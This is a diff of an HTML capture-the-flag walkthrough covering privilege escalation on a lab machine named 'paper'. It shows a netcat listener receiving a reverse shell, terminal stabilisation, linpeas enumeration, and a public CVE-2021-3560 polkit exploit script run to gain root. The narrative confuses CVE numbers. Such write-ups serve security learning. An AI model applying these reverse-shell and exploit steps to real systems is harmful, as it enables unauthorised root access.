@@ -199,12 +199,39 @@ In this case, simply reversing the order of the returned elements suffices and `
 <figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/chat.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/chat.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/chat.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/chat.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/chat.png 999w, https://suppi147.github.io/suppisWriteup/suppi/chat.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/chat.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppi/chat.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>wordpress 5.2.3</strong></figcaption></figure>
 <h1 id="initial-enumerationservice-scan">PRIVILEDGE ESCALATION</h1>
 <h3 id="initial-enumerationservice-scan">SSH</h3>
-<p>now I got the reverse shell I upload python3 -c 'import pty; pty.spawn("/bin/bash")' to make shell look clearer. then I run linpeas.sh and find out its vulnerable 
-  tochat cve-2021-4034 and cve-2021-3560 I try to exploit cve-2021-4043 but It seem impossible cuz they fixed it by requiring root permission to execute the invironment variable
-  in UTF convert library file. So I chose the other one and It works well.</p>
-  <div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
-    
+<p>now I got the reverse shell I do this to make shell look clearer and more flexible.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(dwight@paper$)-&#91;~]
+nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.143] 35844
+script dev null -c bash
+Script started, file is dev
+[dwight@paper hubot]$ ^Z
+[1]+  Stopped                 nc -lvnp 1234
+┌─[✗]─[vitnauchao@vitnauchao]─[~/paper]
+└──╼ $stty raw -echo; fg
+nc -lvnp 1234
+             reset
+reset: unknown terminal type unknown
+Terminal type? rset
+reset: unknown terminal type rset
+Terminal type? reset
+reset: unknown terminal type reset
+Terminal type? ^C
+[dwight@paper hubot]$ ls
+'\'     external-scripts.json   package.json        scripts
+ 127.0.0.1:8000   g.sh        package.json.bak    start_bot.sh
+ 127.0.0.1:8080   LICENSE     package-lock.json   t.txt
+ bin      node_modules      Procfile        yarn.lock
+ dev      node_modules_bak    README.md
+[dwight@paper hubot]$ export TERM=xterm
+[dwight@paper hubot]$ export SHELL=bash
+[dwight@paper hubot]$ clear
     </pre></div>
+<p> then I run linpeas.sh and find out its vulnerable 
+  tochat cve-2021-4034 and <a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">cve-2021-3560</a> I try to exploit cve-2021-4043 but It seem impossible cuz they fixed it by requiring root permission to execute the invironment variable
+  in UTF convert library file. So I chose the other one and It works well.</p>
+
 <figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/cve2.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/cve2.png 999w, https://suppi147.github.io/suppisWriteup/suppi/php.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>CVE-2021-3560</strong></figcaption></figure>
 <p>I upload the <a href="https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh">script</a> then give execute permission to the file then execute it. ./s.sh -u=khoi -p=1.</p>
 <div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(dwight@paper)-&#91;~]
